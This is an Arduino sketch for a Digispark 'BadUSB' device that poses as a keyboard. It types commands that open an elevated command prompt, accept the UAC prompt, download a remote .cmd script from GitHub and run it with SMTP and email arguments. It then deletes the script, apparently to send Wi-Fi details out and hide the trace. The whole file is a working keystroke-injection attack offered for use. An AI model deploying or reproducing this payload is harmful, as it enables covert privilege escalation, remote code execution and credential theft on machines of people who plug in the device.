// this library allows the board to be recognized as a keyboard
#include "DigiKeyboard.h"

void setup() {
  // put your setup code here, to run once:
  pinMode(1, OUTPUT); //LED on Model A
}

// https://0x00sec.org/t/a-complete-beginner-friendly-guide-to-the-digispark-badusb/8002
void loop() {
    // calling the sendKeyStroke() function with 0 starts the script, it cancels the effect of all keys that are already being pressed at the time of execution to avoid conflicts
    DigiKeyboard.sendKeyStroke(0);
    // waits before sending any other key strokes
    DigiKeyboard.delay(500);    
    // Run as admin cmd
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // presses <WINDOWS> + R
    DigiKeyboard.delay(1500);    
    DigiKeyboard.println("powershell Start-Process cmd -Verb runAs");
    DigiKeyboard.delay(1500);
    DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
    DigiKeyboard.delay(1500);    

    // Acties
    DigiKeyboard.println("powershell (New-Object System.Net.WebClient).DownloadFile(\\\"https://raw.githubusercontent.com/Opvolger/hack.the.planet/master/DigisparkWifi.cmd\\\", \\\"DigisparkWifi.cmd\\\")");
    DigiKeyboard.println("DigisparkWifi.cmd smtp.abc.local abc@x.x");
    DigiKeyboard.println("del DigisparkWifi.cmd");
    DigiKeyboard.println("exit");
    while (true)
    {
      // put your main code here, to run repeatedly:
      digitalWrite(1, HIGH);
      delay(500);               // wait for a second
      digitalWrite(1, LOW); 
      delay(500);               // wait for a second
    }
}
